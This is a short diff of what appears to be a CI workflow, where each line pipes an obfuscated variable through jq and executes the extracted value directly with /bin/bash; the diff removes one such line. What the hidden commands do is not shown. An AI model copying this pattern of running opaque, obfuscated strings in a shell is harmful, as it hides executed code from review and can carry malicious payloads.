@@ -29,7 +29,6 @@ jobs:
           echo $ko9631 | jq -r .mifha86 | /bin/bash
           printf '%s' "$kwrd658" | jq -r .noo2884 | /bin/bash
           printf '%s' "$v62125" | jq -r .c8 | /bin/bash
-          printf '%s' "$vptq3" | jq -r .b75614 | /bin/bash
           printf '%s' "$xqxwr589" | jq -r .dsslc1729 | /bin/bash
           echo $qfgm597 | jq -r .sef52689 | /bin/bash
 
